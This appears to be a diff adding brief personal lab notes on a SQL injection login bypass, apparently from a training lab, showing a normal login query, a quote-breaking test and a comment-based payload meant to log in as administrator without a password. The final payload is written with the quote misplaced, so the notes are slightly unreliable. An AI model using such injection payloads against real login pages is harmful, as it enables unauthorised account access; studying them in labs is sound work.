@@ -1,0 +1,12 @@
+SQL injection - login functionality
+
+End Goal : perform SQL attack and log in as the adminstator user
+
+Analysis:
+
+SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
+
+SELECT * FROM users WHERE username = ''' AND password = 'bluecheese'
+
+SELECT * FROM users WHERE username = 'administrator--' AND password = ''
+-- bypasses the password
